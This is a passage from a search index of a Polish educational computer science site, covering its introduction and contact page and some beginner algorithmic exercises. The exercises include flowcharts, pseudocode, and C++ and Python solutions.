{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":[" "]},"docs":[{"location":"","title":"Informatyka: Trudne Tematy w Najprostszy Spos\u00f3b","text":"<p>Na tej stronie znajdziesz om\u00f3wienie r\u00f3\u017cnych temat\u00f3w z dziedziny informatyki. Ka\u017cdy temat przygotowywany jest zgodnie z has\u0142em przewodnim: jak najpro\u015bciej i jednocze\u015bnie praktycznie. Materia\u0142y s\u0105 przeznaczone dla wszystkich, kt\u00f3rzy pragn\u0105 poszerzy\u0107 swoj\u0105 wiedz\u0119, a tak\u017ce dla tych, kt\u00f3rzy pragn\u0105 j\u0105 przekazywa\u0107 innym.</p> <p>Uczniowie odnajd\u0105 tutaj jasne i zwi\u0119z\u0142e om\u00f3wienia wybranych zagadnie\u0144, natomiast nauczyciele odkryj\u0105 inspiruj\u0105ce pomys\u0142y na lekcje i gotowe scenariusze zaj\u0119\u0107.</p>"},{"location":"#czym-rozni-sie-ta-strona-od-podobnych-ktore-mozna-znalezc-w-sieci","title":"Czym r\u00f3\u017cni si\u0119 ta strona od podobnych, kt\u00f3re mo\u017cna znale\u017a\u0107 w sieci?","text":"<p>Pierwsz\u0105 r\u00f3\u017cnic\u0105, szczeg\u00f3lnie istotn\u0105 dla nauczycieli, jest to, \u017ce ta strona jest dost\u0119pna w j\u0119zyku polskim. Wiele rozbudowanych stron o podobnej tematyce jest dost\u0119pnych tylko po angielsku, co utrudnia ich wykorzystanie podczas lekcji.</p> <p>Po drugie, strona zosta\u0142a przygotowana przez \"rasowego informatyka z nietypowym hobby\". Tak, z wykszta\u0142cenia jestem informatykiem, pracowa\u0142em tak\u017ce jako programista i stale rozwijam swoje umiej\u0119tno\u015bci w tym zakresie. Ponadto pasjonuje mnie edukacja i dydaktyka. Od wielu lat zajmuj\u0119 si\u0119 nauczaniem informatyki dzieci i doros\u0142ych na r\u00f3\u017cnych poziomach. Wiele stron o podobnej tematyce pomija jeden z dw\u00f3ch wa\u017cnych aspekt\u00f3w: dydaktyk\u0119 lub profesjonalizm. Materia\u0142y napisane w profesjonalny spos\u00f3b i z solidnym pod\u0142o\u017cem teoretycznym cz\u0119sto s\u0105 trudne do zrozumienia i skierowane raczej do student\u00f3w wy\u017cszych uczelni ni\u017c do zwyk\u0142ego \u015bmiertelnika. Z drugiej strony wielu materia\u0142om dydaktycznym z informatyki brakuje profesjonalizmu: wida\u0107, \u017ce tworzy\u0142a je osoba, kt\u00f3ra nie posiada dog\u0142\u0119bnego do\u015bwiadczenia w tej dziedzinie i nie jest \u015bwiadoma dobrych praktyk. Przygotowuj\u0105c materia\u0142y na mojej stronie, staram si\u0119 uwzgl\u0119dnia\u0107 oba aspekty (oczywi\u015bcie wszelkie b\u0142\u0119dy i/lub nie\u015bcis\u0142o\u015bci prosz\u0119 zg\u0142asza\u0107, myli\u0107 si\u0119 jest rzecz\u0105 ludzk\u0105).</p> <p>Po trzecie, materia\u0142y przygotowane zosta\u0142y (jak ju\u017c wspomnia\u0142em) z my\u015bl\u0105 \"w jak najprostszy spos\u00f3b\" i z poszanowaniem czasu czytelnika. D\u0105\u017c\u0119 do tego, aby ka\u017cdy m\u00f3g\u0142 zrozumie\u0107 omawiane przeze mnie tematy, i to w stosunkowo kr\u00f3tkim czasie. W zwi\u0105zku z tym nie tworz\u0119 d\u0142ugich opracowa\u0144 na temat prostego algorytmu, skupiam si\u0119 raczej na istotnych punktach i prostych przyk\u0142adach. Z drugiej strony oznacza to, \u017ce nie omawiam niekt\u00f3rych niuans\u00f3w, a cz\u0119\u015b\u0107 szczeg\u00f3\u0142\u00f3w poruszam jedynie pobie\u017cnie. Jak m\u00f3wi staro\u017cytne przys\u0142owie: \"co\u015b za co\u015b\". Moje materia\u0142y powinny pom\u00f3c zrozumie\u0107 podstawy i og\u00f3ln\u0105 ide\u0119, natomiast zainteresowanych szczeg\u00f3\u0142ami odsy\u0142am do innych \u017ar\u00f3de\u0142.</p> <p>Po czwarte, materia\u0142y przechodz\u0105 sw\u00f3j chrzest bojowy. Sam korzystam z nich na lekcjach i prosz\u0119 znajomych o przejrzenie. Je\u017celi zauwa\u017c\u0119, \u017ce co\u015b wymaga poprawienia albo uzupe\u0142nienia, to poprawiam i/lub uzupe\u0142niam. Wszelkie uwagi mo\u017cna tak\u017ce zg\u0142asza\u0107, zapraszam do zajrzenia do zak\u0142adki kontakt.</p>"},{"location":"#prezentacja-na-temat-strony","title":"Prezentacja na temat strony","text":"<p> Prezentacja</p>"},{"location":"#licencja","title":"Licencja","text":""},{"location":"contact/","title":"Kontakt","text":"<p>Wszystkich zainteresowanych samym projektem i/lub tematami i kursami zamieszczonymi na tej stronie zapraszamy do kontaktu mailowego pod adresem d.kurpiewski@proton.me.</p> <p>Prosimy tak\u017ce bardzo gor\u0105co o zg\u0142aszanie wszelkich uwag, b\u0142\u0119d\u00f3w i sugestii.</p>"},{"location":"ai/","title":"Wst\u0119p do Sztucznej Inteligencji (SI)","text":"<p>Sztuczna Inteligencja (SI) to jedno z najbardziej ekscytuj\u0105cych i dynamicznie rozwijaj\u0105cych si\u0119 obszar\u00f3w nauki i technologii. Znajduje ona coraz szersze zastosowanie we wsp\u00f3\u0142czesnym \u015bwiecie, przyczyniaj\u0105c si\u0119 do przyspieszenia rozwoju w wielu dziedzinach, od medycyny, przez edukacj\u0119, po biznes i przemys\u0142.</p> <p>Zasada dzia\u0142ania SI opiera si\u0119 na tworzeniu modeli matematycznych i algorytm\u00f3w, kt\u00f3re na\u015bladuj\u0105 procesy my\u015blowe cz\u0142owieka, takie jak uczenie si\u0119, rozumienie j\u0119zyka, rozpoznawanie wzorc\u00f3w, podejmowanie decyzji i rozwi\u0105zywanie problem\u00f3w. Technologie te umo\u017cliwiaj\u0105 komputerom wykonanie zada\u0144, kt\u00f3re dotychczas by\u0142y mo\u017cliwe tylko dzi\u0119ki inteligencji ludzkiej.</p> <p>Obecnie SI jest niew\u0105tpliwie si\u0142\u0105 nap\u0119dow\u0105 za wieloma innowacjami technologicznymi. Jest kluczowym elementem takich dziedzin jak analiza danych, automatyzacja proces\u00f3w, robotyka, systemy rekomendacyjne, rozpoznawanie mowy czy przetwarzanie j\u0119zyka naturalnego. Coraz cz\u0119\u015bciej SI jest wykorzystywana w takich obszarach jak medycyna do diagnozowania chor\u00f3b, w finansach do analizy ryzyka kredytowego, w edukacji do indywidualizacji procesu nauczania, czy w energetyce do optymalizacji zu\u017cycia energii.</p> <p>Dlatego kluczowe jest zrozumienie podstawowych zasad i koncepcji SI, jej mo\u017cliwo\u015bci, ogranicze\u0144, a tak\u017ce spo\u0142ecznych i etycznych konsekwencji jej rozwoju. Niniejszy dzia\u0142 ma na celu dostarczenie takiej wiedzy, kt\u00f3ra pozwoli na pe\u0142niejsze zrozumienie roli, jak\u0105 SI odgrywa we wsp\u00f3\u0142czesnym \u015bwiecie.</p>"},{"location":"algorithmic-exercises/","title":"Wst\u0119p","text":"<p>W tym dziale zgromadzili\u015bmy szeroki wyb\u00f3r zada\u0144 algorytmiczno-programistycznych o r\u00f3\u017cnym stopniu trudno\u015bci. Niekt\u00f3re z nich s\u0105 tw\u00f3rczo\u015bci\u0105 naszych autor\u00f3w, jednak znaczna cz\u0119\u015b\u0107 to zadania inspirowane zagadnieniami dost\u0119pnymi w renomowanych serwisach, takich jak UVA czy SPOJ. W trosce o transparentno\u015b\u0107, w przypadku zada\u0144 adaptowanych, zawsze umieszczamy link do \u017ar\u00f3d\u0142a.</p> <p>Ka\u017cde zadanie zawiera dok\u0142adny opis problemu do rozwi\u0105zania, a wi\u0119kszo\u015b\u0107 zawiera tak\u017ce przyk\u0142adow\u0105 implementacj\u0119. Dodatkowo, przy niekt\u00f3rych zagadnieniach, dost\u0119pne s\u0105 dodatkowe wskaz\u00f3wki czy uwagi, kt\u00f3re mog\u0105 pom\u00f3c w zrozumieniu problemu lub wskaza\u0107 kierunek poszukiwa\u0144 rozwi\u0105zania. Zach\u0119camy do podj\u0119cia wyzwania i samodzielnego rozwi\u0105zania zadania zanim zajrzysz do proponowanej odpowiedzi.</p> <p>Zadanie w ka\u017cdym przypadku jest takie samo: zaproponuj algorytm i/lub napisz program, kt\u00f3ry b\u0119dzie zgodny z podanym opisem i spe\u0142ni okre\u015blon\u0105 specyfikacj\u0119. Rozwi\u0105zuj\u0105c zadania rozwiniesz umiej\u0119tno\u015bci logicznego my\u015blenia, nauczysz si\u0119 nowych algorytm\u00f3w i poznasz techniki programistyczne.</p>"},{"location":"algorithmic-exercises/level-0/","title":"Poziom 0","text":"<p>Dobre miejsce, by zacz\u0105\u0107 swoj\u0105 przygod\u0119 z rozwi\u0105zywaniem zada\u0144 algorytmicznych.</p>"},{"location":"algorithmic-exercises/level-0/school-physics/","title":"Szkolna fizyka","text":""},{"location":"algorithmic-exercises/level-0/school-physics/#opis","title":"Opis","text":"<p>Cz\u0105steczka ma pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 i przyspieszenie. Je\u017celi jej pr\u0119dko\u015b\u0107 po okre\u015blonym czasie \\(t\\) wynosi \\(v\\), to o ile jednostek przemie\u015bci si\u0119 cz\u0105steczka w czasie \\(2t\\)?</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/100/10071.pdf</p>"},{"location":"algorithmic-exercises/level-0/school-physics/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-0/school-physics/#dane","title":"Dane","text":"<ul> <li>\\(v\\) - liczba ca\u0142kowita, pr\u0119dko\u015b\u0107 cz\u0105steczki w czasie \\(t\\), \\(-100\\leq v\\leq 100\\).</li> <li>\\(t\\) - liczba naturalna, czas, \\(0\\leq t\\leq200\\).</li> </ul>"},{"location":"algorithmic-exercises/level-0/school-physics/#wynik","title":"Wynik","text":"<ul> <li>Odleg\u0142o\u015b\u0107, o jak\u0105 cz\u0105steczka przemie\u015bci si\u0119 w czasie \\(2t\\).</li> </ul>"},{"location":"algorithmic-exercises/level-0/school-physics/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-0/school-physics/#dane_1","title":"Dane","text":"<pre><code>0 0\n</code></pre> <p>Wynik: \\(0\\)</p>"},{"location":"algorithmic-exercises/level-0/school-physics/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-0/school-physics/#dane_2","title":"Dane","text":"<pre><code>5 12\n</code></pre> <p>Wynik: \\(120\\)</p>"},{"location":"algorithmic-exercises/level-0/compare-integers/","title":"Por\u00f3wnywanie liczb","text":"<p>Maj\u0105c dane dwie liczby ca\u0142kowite, Twoim zadaniem jest okre\u015blenie relacji pomi\u0119dzy nimi - czy pierwsza liczba jest mniejsza, wi\u0119ksza, czy r\u00f3wna drugiej.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/111/11172.pdf</p>"},{"location":"algorithmic-exercises/level-0/compare-integers/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-0/compare-integers/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - liczby ca\u0142kowite z przedzia\u0142u \\([-10^5,10^5]\\)</li> </ul>"},{"location":"algorithmic-exercises/level-0/compare-integers/#wynik","title":"Wynik","text":"<ul> <li>Znak relacji pomi\u0119dzy liczbami \\(a\\) i \\(b\\), tzn. jeden ze znak\u00f3w: \\(&lt;\\), \\(&gt;\\), \\(=\\)</li> </ul>"},{"location":"algorithmic-exercises/level-0/compare-integers/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-0/compare-integers/#dane_1","title":"Dane","text":"<pre><code>a := 10\nb := 15\n</code></pre>"},{"location":"algorithmic-exercises/level-0/compare-integers/#wynik_1","title":"Wynik","text":"<pre><code>&lt;\n</code></pre> <p>Info</p>"},{"location":"algorithmic-exercises/level-0/compare-integers/#wyjasnienie","title":"Wyja\u015bnienie:","text":"<p>\\(10\\) jest mniejsze od \\(15\\), wi\u0119c \\(a\\) jest mniejsze od \\(b\\), dlatego wypisujemy znak mniejszo\u015bci (\\(&lt;\\)).</p>"},{"location":"algorithmic-exercises/level-0/compare-integers/block-diagram/","title":"Block diagram","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1[/Wczytaj a, b/]\n    K1 --&gt; K2{a = b}\n    K2 -- PRAWDA --&gt; K3[/Wypisz '='/]\n    K2 -- FA\u0141SZ --&gt; K4{a &lt; b}\n    K4 -- PRAWDA --&gt; K5[/Wypisz '&lt;'/]\n    K4 -- FA\u0141SZ --&gt; K7[/Wypisz '&gt;'/]\n    K3 --&gt; STOP([STOP])\n    K5 --&gt; STOP\n    K7 --&gt; STOP </code></pre>"},{"location":"algorithmic-exercises/level-0/compare-integers/blockly/","title":"Blockly","text":""},{"location":"algorithmic-exercises/level-0/compare-integers/blockly/#link-do-implementacji","title":"Link do implementacji","text":"<p>Por\u00f3wnywanie liczb - Blockly</p>"},{"location":"algorithmic-exercises/level-0/compare-integers/blockly/#opis","title":"Opis","text":"<p>Na pocz\u0105tku wczytujemy dwie liczby od u\u017cytkownika, podaj\u0105c przy tym stosowane komunikaty i zapisuj\u0105c je w zmiennych <code>a</code> i <code>b</code>.</p> <p>Nast\u0119pnie, korzystaj\u0105c z instrukcji warunkowej, sprawdzamy relacj\u0119 pomi\u0119dzy wczytanymi warto\u015bciami. Je\u017celi warto\u015bci zmiennych <code>a</code> i <code>b</code> s\u0105 sobie r\u00f3wne to wypisujemy znak r\u00f3wno\u015bci. W przeciwnym przypadku, je\u017celi warto\u015b\u0107 zmiennej <code>a</code> jest mniejsza od warto\u015bci zmiennej <code>b</code> , to wypisujemy znak mniejszo\u015bci. W przeciwnym przypadku wypisujemy znak wi\u0119kszo\u015bci.</p> <p>Zwr\u00f3\u0107 uwag\u0119 na to, \u017ce w ostatniej cz\u0119\u015bci instrukcji warunkowej, nie musimy ju\u017c sprawdza\u0107, czy warto\u015b\u0107 zmiennej <code>a</code> jest wi\u0119ksza od warto\u015bci zmiennej <code>b</code>. Wynika to z poprzednich warunk\u00f3w. Je\u017celi warto\u015bci zmiennych nie s\u0105 sobie r\u00f3wne ani te\u017c <code>a</code> nie jest mniejsze od <code>b</code>, to wiemy, \u017ce <code>a</code> jest wi\u0119ksze od <code>b</code>.</p>"},{"location":"algorithmic-exercises/level-0/compare-integers/c%2B%2B/","title":"C++","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b;\n\n    cout &lt;&lt; \"Podaj a:\" &lt;&lt; endl;\n    cin &gt;&gt; a;\n\n    cout &lt;&lt; \"Podaj b:\" &lt;&lt; endl;\n    cin &gt;&gt; b;\n\n    if (a == b) {\n        cout &lt;&lt; \"=\" &lt;&lt; endl;\n    } else if (a &lt; b) {\n        cout &lt;&lt; \"&lt;\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"&gt;\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/level-0/compare-integers/c%2B%2B/#opis-implementacji","title":"Opis implementacji","text":"<p>Na pocz\u0105tku deklarujemy dwie zmienne ca\u0142kowite <code>a</code> i <code>b</code> do przechowywania danych wej\u015bciowych (linia 5). Nast\u0119pnie wczytujemy dwie warto\u015bci od u\u017cytkownika (linie 7-11), podaj\u0105c przy tym stosowane komunikaty.</p> <p>Nast\u0119pnie, korzystaj\u0105c z instrukcji warunkowej, sprawdzamy relacj\u0119 pomi\u0119dzy wczytanymi warto\u015bciami. Je\u017celi warto\u015bci zmiennych <code>a</code> i <code>b</code> s\u0105 sobie r\u00f3wne (linia 13) to wypisujemy znak r\u00f3wno\u015bci (linia 14). W przeciwnym przypadku, je\u017celi warto\u015b\u0107 zmiennej <code>a</code> jest mniejsza od warto\u015bci zmiennej <code>b</code> (linia 15), to wypisujemy znak mniejszo\u015bci (linia 16). W przeciwnym przypadku (linia 17) wypisujemy znak wi\u0119kszo\u015bci (linia 18).</p> <p>Zwr\u00f3\u0107 uwag\u0119 na to, \u017ce w ostatniej cz\u0119\u015bci instrukcji warunkowej (linia 17), nie musimy ju\u017c sprawdza\u0107, czy warto\u015b\u0107 zmiennej <code>a</code> jest wi\u0119ksza od warto\u015bci zmiennej <code>b</code>. Wynika to z poprzednich warunk\u00f3w. Je\u017celi warto\u015bci zmiennych nie s\u0105 sobie r\u00f3wne ani te\u017c <code>a</code> nie jest mniejsze od <code>b</code>, to wiemy, \u017ce <code>a</code> jest wi\u0119ksze od <code>b</code>.</p>"},{"location":"algorithmic-exercises/level-0/compare-integers/pseudocode/","title":"Pseudokod","text":"<pre><code>1. Wczytaj a, b\n2. Je\u017celi a = b, to:\n    3. Wypisz \"=\"\n4. W przeciwnym przypadku, je\u017celi a &lt; b, to:\n    5. Wypisz \"&lt;\"\n6. W przeciwnym przypadku:\n    7. Wypisz \"&gt;\"\n</code></pre>"},{"location":"algorithmic-exercises/level-0/compare-integers/pseudocode/#opis","title":"Opis","text":"<p>Na pocz\u0105tku wczytujemy dwie warto\u015bci od u\u017cytkownika (krok 1).</p> <p>Nast\u0119pnie, korzystaj\u0105c z instrukcji warunkowej, sprawdzamy relacj\u0119 pomi\u0119dzy wczytanymi warto\u015bciami. Je\u017celi warto\u015bci zmiennych <code>a</code> i <code>b</code> s\u0105 sobie r\u00f3wne (krok 2) to wypisujemy znak r\u00f3wno\u015bci (krok 3). W przeciwnym przypadku, je\u017celi warto\u015b\u0107 zmiennej <code>a</code> jest mniejsza od warto\u015bci zmiennej <code>b</code> (krok 4), to wypisujemy znak mniejszo\u015bci (krok 5). W przeciwnym przypadku (krok 6) wypisujemy znak wi\u0119kszo\u015bci (krok 7).</p> <p>Zwr\u00f3\u0107 uwag\u0119 na to, \u017ce w ostatniej cz\u0119\u015bci instrukcji warunkowej (krok 6), nie musimy ju\u017c sprawdza\u0107, czy warto\u015b\u0107 zmiennej <code>a</code> jest wi\u0119ksza od warto\u015bci zmiennej <code>b</code>. Wynika to z poprzednich warunk\u00f3w. Je\u017celi warto\u015bci zmiennych nie s\u0105 sobie r\u00f3wne ani te\u017c <code>a</code> nie jest mniejsze od <code>b</code>, to wiemy, \u017ce <code>a</code> jest wi\u0119ksze od <code>b</code>.</p>"},{"location":"algorithmic-exercises/level-0/compare-integers/python/","title":"Python","text":"<pre><code>a = int(input(\"Podaj a: \"))\nb = int(input(\"Podaj b: \"))\n\nif a == b:\n    print(\"=\")\nelif a &lt; b:\n    print(\"&lt;\")\nelse:\n    print(\"&gt;\")\n</code></pre>"},{"location":"algorithmic-exercises/level-0/compare-integers/python/#opis","title":"Opis","text":"<p>Na pocz\u0105tku wczytujemy dwie warto\u015bci od u\u017cytkownika (linie 1 i 2). Poniewa\u017c spodziewamy si\u0119 liczb ca\u0142kowitych, to poza funkcj\u0105 <code>input</code> do wczytania warto\u015bci u\u017cywamy tak\u017ce funkcji <code>int</code> do zamiany wczytanych warto\u015bci (kt\u00f3re s\u0105 przechowywane w postaci ci\u0105g\u00f3w znak\u00f3w typu <code>string</code>) na liczby ca\u0142kowite.</p> <p>Nast\u0119pnie, korzystaj\u0105c z instrukcji warunkowej, sprawdzamy relacj\u0119 pomi\u0119dzy wczytanymi warto\u015bciami. Je\u017celi warto\u015bci zmiennych <code>a</code> i <code>b</code> s\u0105 sobie r\u00f3wne (linia 4) to wypisujemy znak r\u00f3wno\u015bci (linia 5). W przeciwnym przypadku, je\u017celi warto\u015b\u0107 zmiennej <code>a</code> jest mniejsza od warto\u015bci zmiennej <code>b</code> (linia 6), to wypisujemy znak mniejszo\u015bci (linia 7). W przeciwnym przypadku (linia 8) wypisujemy znak wi\u0119kszo\u015bci (linia 9).</p> <p>Zwr\u00f3\u0107 uwag\u0119 na to, \u017ce w ostatniej cz\u0119\u015bci instrukcji warunkowej (linia 8), nie musimy ju\u017c sprawdza\u0107, czy warto\u015b\u0107 zmiennej <code>a</code> jest wi\u0119ksza od warto\u015bci zmiennej <code>b</code>. Wynika to z poprzednich warunk\u00f3w. Je\u017celi warto\u015bci zmiennych nie s\u0105 sobie r\u00f3wne ani te\u017c <code>a</code> nie jest mniejsze od <code>b</code>, to wiemy, \u017ce <code>a</code> jest wi\u0119ksze od <code>b</code>.</p>"},{"location":"algorithmic-exercises/level-0/cutting-costs/","title":"Ci\u0119cie koszt\u00f3w","text":"<p>W ramach przeprowadzanej przez pewn\u0105 firm\u0119 redukcji zatrudnienia, pracownicy dzia\u0142aj\u0105cy w trzyosobowych zespo\u0142ach podlegaj\u0105 ocenie. Zarobki w obr\u0119bie ka\u017cdego zespo\u0142u mog\u0105 si\u0119 r\u00f3\u017cni\u0107. Zarz\u0105d firmy podj\u0105\u0142 decyzj\u0119, \u017ce z ka\u017cdego zespo\u0142u zwolnione zostan\u0105 dwie osoby o skrajnych zarobkach - osoba zarabiaj\u0105ca najmniej oraz osoba zarabiaj\u0105ca najwi\u0119cej. Twoim zadaniem jest okre\u015blenie, kto przetrwa redukcj\u0119 i pozostanie zatrudniony w zespole.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/117/11727.pdf</p>"},{"location":"algorithmic-exercises/level-0/cutting-costs/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-0/cutting-costs/#dane","title":"Dane","text":"<ul> <li>\\(a,b,c\\) - trzy liczby naturalne okre\u015blaj\u0105ce zarobki pracownik\u00f3w, wszystkie w zakresie \\([1000, 10000]\\)</li> </ul>"},{"location":"algorithmic-exercises/level-0/cutting-costs/#wynik","title":"Wynik","text":"<ul> <li>Zarobki pracownika, kt\u00f3ry pozostanie zatrudniony</li> </ul>"},{"location":"algorithmic-exercises/level-0/cutting-costs/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithmic-exercises/level-0/cutting-costs/#dane_1","title":"Dane","text":"<pre><code>a := 1500\nb := 1200\nc := 1800\n</code></pre> <p>Wynik: \\(1500\\)</p> <p>Info</p>"},{"location":"algorithmic-exercises/level-0/cutting-costs/#wyjasnienie","title":"Wyja\u015bnienie","text":"<p>Najmniejsza z warto\u015bci to \\(1200\\), a najwi\u0119ksza do \\(1800\\), pozostaje wi\u0119c \\(1500\\).</p>"},{"location":"algorithmic-exercises/level-0/cutting-costs/block-diagram/","title":"Block diagram","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1[/Wczytaj a, b, c/]\n    K1 --&gt; K2[\"suma := a + b + c\n    minimum := a\"]\n    K2 --&gt; K4{b &lt; minimum}\n    K4 -- PRAWDA --&gt; K5[minimum := b]\n    K4 -- FA\u0141SZ --&gt; K6{c &lt; minimum}\n    K5 --&gt; K6\n    K6 -- PRAWDA --&gt; K7[minimum := c]\n    K6 -- FA\u0141SZ --&gt; K8[maksimum := a]\n    K7 --&gt; K8\n    K8 --&gt; K9{b &gt; maksimum}\n    K9 -- PRAWDA --&gt; K10[maksimum := b]\n    K9 -- FA\u0141SZ --&gt; K11{c &gt; maksimum}\n    K10 --&gt; K11\n    K11 -- PRAWDA --&gt; K12[maksimum := c]\n    K11 -- FA\u0141SZ --&gt; K13[wynik := suma - minimum - maksimum]\n    K12 --&gt; K13\n    K13 --&gt; K14[/Wypisz wynik/]\n    K14 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithmic-exercises/level-0/cutting-costs/pseudocode/","title":"Pseudokod","text":""},{"location":"algorithmic-exercises/level-0/cutting-costs/pseudocode/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>1. Wczytaj a, b, c\n2. suma := a + b + c\n3. minimum := a\n4. Je\u017celi b &lt; minimum, to:\n    5. minimum := b\n6. Je\u017celi c &lt; minimum, to:\n    7. minimum := c\n8. maksimum := a\n9. Je\u017celi b &gt; maksimum, to:\n    10. maksimum := b\n11. Je\u017celi c &gt; maksimum, to:\n    12. maksimum := c\n13. wynik := suma - minimum - maksimum\n14. Wypisz wynik\n</code></pre>"},{"location":"algorithmic-exercises/level-0/cutting-costs/pseudocode/#opis","title":"Opis","text":"<p>Na pocz\u0105tku wczytujemy dane wej\u015bciowe: trzy liczby ca\u0142kowite (krok 1). Nast\u0119pnie obliczamy sum\u0119 wczytanych liczb (krok 2).</p> <p>Teraz przyst\u0119pujemy do znalezienia najmniejszej z warto\u015bci. Korzystamy ze standardowego algorytmu na znajdowanie minimum (kroki 3-7). W nast\u0119pnej kolejno\u015bci, w analogiczny spos\u00f3b znajdujemy maksimum (kroki 8-12).</p> <p>Na koniec obliczamy wynik, odejmuj\u0105c minimum i maksimum od sumy i w ten spos\u00f3b pozostawiaj\u0105c warto\u015b\u0107 \u015brodkow\u0105 (krok 13). Obliczony wynik wypisujemy (krok 14).</p>"},{"location":"algorithmic-exercises/level-0/holidays-packing/","title":"Pakowanie na wakacje","text":"<p>Nadesz\u0142y wyczekiwane wakacje i planujesz wyjazd. Przed Tob\u0105 jednak wyzwanie spakowania si\u0119. Masz do dyspozycji jedn\u0105 walizk\u0119 w kszta\u0142cie prostopad\u0142o\u015bcianu o wymiarach \\(20cm\\times20cm\\times20cm\\). Zdo\u0142a\u0142e\u015b skompilowa\u0107 wszystkie niezb\u0119dne rzeczy w jeden ma\u0142y pakunek, r\u00f3wnie\u017c o kszta\u0142cie prostopad\u0142o\u015bcianu. Wobec tego, pytanie brzmi: czy zmie\u015bci si\u0119 on w Twojej walizce? Zale\u017cy Ci na bezpiecze\u0144stwie rzeczy, wi\u0119c pakunek nie mo\u017ce wystawa\u0107 poza walizk\u0119 i musi by\u0107 u\u0142o\u017cony tak, aby jego boki by\u0142y r\u00f3wnoleg\u0142e do bok\u00f3w walizki.</p> <p>\u0179r\u00f3d\u0142o: https://onlinejudge.org/external/123/12372.pdf</p>"},{"location":"algorithmic-exercises/level-0/holidays-packing/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithmic-exercises/level-0/holidays-packing/#dane","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - liczby naturalne, wymiary pakunku, wszystkie z zakresu \\([1, 50]\\)</li> </ul>"},{"location":"algorithmic-exercises/level-0/holidays-packing/#wynik","title":"Wynik","text":"<ul> <li>Komunikat \"TAK\", je\u017celi pakunek zmie\u015bci si\u0119 walizce, lub komunikat \"NIE\" w przeciwnym przypadku</li> </ul>"},{"location":"algorithmic-exercises/level-0/holidays-packing/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithmic-exercises/level-0/holidays-packing/#dane_1","title":"Dane","text":"<pre><code>a := 20\nb := 20\nc := 20\n</code></pre> <p>Wynik: \"TAK\"</p>"},{"location":"algorithmic-exercises/level-0/holidays-packing/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithmic-exercises/level-0/holidays-packing/#dane_2","title":"Dane","text":"<pre><code>a := 1\nb := 2\nc := 21\n</code></pre> <p>Wynik: \"NIE\"</p>"},{"location":"algorithmic-exercises/level-0/holidays-packing/block-diagram/","title":"Block diagram","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([START]) --&gt; K1[/Wczytaj a, b, c/]\n    K1 --&gt; K2{\"a &lt;= 20\n    oraz\n    b &lt;= 20\n    oraz\n    c &lt;= 20\"}\n    K2 -- PRAWDA --&gt; K3[/Wypisz 'TAK'/]\n    K2 -- FA\u0141SZ --&gt; K5[/Wypisz 'NIE'/]\n    K3 --&gt; STOP([STOP])\n    K5 --&gt; STOP</code></pre>"},{"location":"algorithmic-exercises/level-0/holidays-packing/pseudocode/","title":"Pseudokod","text":""},{"location":"algorithmic-exercises/level-0/holidays-packing/pseudocode/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>1. Wczytaj a, b, c\n2. Je\u017celi a &lt;= 20 oraz b &lt;= 20 oraz c &lt;= 20, to:\n    3. Wypisz \"TAK\"\n4. w przeciwnym przypadku:\n    5. Wypisz \"NIE\"\n</code></pre>"},{"location":"algorithmic-exercises/level-0/holidays-packing/pseudocode/#opis","title":"Opis","text":"<p>Na pocz\u0105tku wczytujemy dane wej\u015bciowe: trzy liczby ca\u0142kowite (krok 1). Nast\u0119pnie sprawdzamy, czy kt\u00f3ra\u015b z liczb przekracza warto\u015b\u0107 \\(20\\), czyli wymiar walizki (krok 2). Je\u017celi wszystkie liczby s\u0105 mniejsze od \\(20\\) to wypisujemy komunikat \"TAK\" (krok 3). Je\u017celi kt\u00f3ra\u015b z liczb przekracza warto\u015b\u0107 \\(20\\) to wypisujemy komunikat \"NIE\" (krok 5).</p>"},{"location":"algorithmic-exercises/level-1/","title":"Poziom 1","text":"<p>Przy niekt\u00f3rych zadaniach trzeba chwil\u0119 pomy\u015ble\u0107. Efektywno\u015b\u0107 rozwi\u0105zania nie jest tutaj bardzo istotna, ale warto d\u0105\u017cy\u0107 do jak najlepszej z\u0142o\u017cono\u015bci.</p>"},{"location":"algorithmic-exercises/level-1/byte-warriors/","title":"Bajtowi wojownicy","text":"<p>Struktura oddzia\u0142u Bajtowych Wojownik\u00f3w jest zorganizowana w taki spos\u00f3b, \u017ce pierwszy rz\u0105d sk\u0142ada si\u0119 z jednego wojownika, drugi z dw\u00f3ch, trzeci z trzech i tak dalej. Oznacza to, \u017ce ka\u017cdy \\(i\\)-ty rz\u0105d sk\u0142ada si\u0119 z \\(i\\) wojownik\u00f3w.</p> <p>Twoim zadaniem jest obliczenie liczby rz\u0119d\u00f3w, znaj\u0105c ca\u0142kowit\u0105 liczb\u0119 wojownik\u00f3w w oddziale. Zwr\u00f3\u0107 uwag\u0119, \u017ce nie zawsze wystarczy wojownik\u00f3w 